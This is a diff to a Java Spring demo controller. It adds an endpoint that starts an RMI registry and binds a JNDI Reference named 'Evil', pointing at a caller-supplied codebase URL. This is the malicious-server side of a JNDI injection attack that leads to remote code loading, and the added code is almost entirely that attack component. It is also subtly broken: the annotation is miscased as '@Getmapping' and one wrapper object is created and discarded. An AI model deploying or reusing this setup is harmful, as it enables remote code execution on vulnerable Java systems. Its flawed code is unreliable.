@@ -18,4 +18,18 @@ public class DemoController {
         System.out.println("success!");
         return "success";
     }
+
+    @Getmapping
+    public String testJndi(String url){
+                Properties env = new Properties();
+                env.put(Context.INITIAL_CONTEXT_FACTORY,"com.sun.jndi.rmi.registry.RegistryContextFactory");      
+                env.put(Context.PROVIDER_URL,"rmi://127.0.0.1:1099");
+                InitialContext ctx = new InitialContext(env);
+                LocateRegistry.createRegistry(1099);
+                Reference reference = new Reference("Evil", "Evil", url);
+                new ReferenceWrapper(reference);    
+                ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);        
+                ctx.bind("evil", referenceWrapper);
+                return "success";
+    }
 }
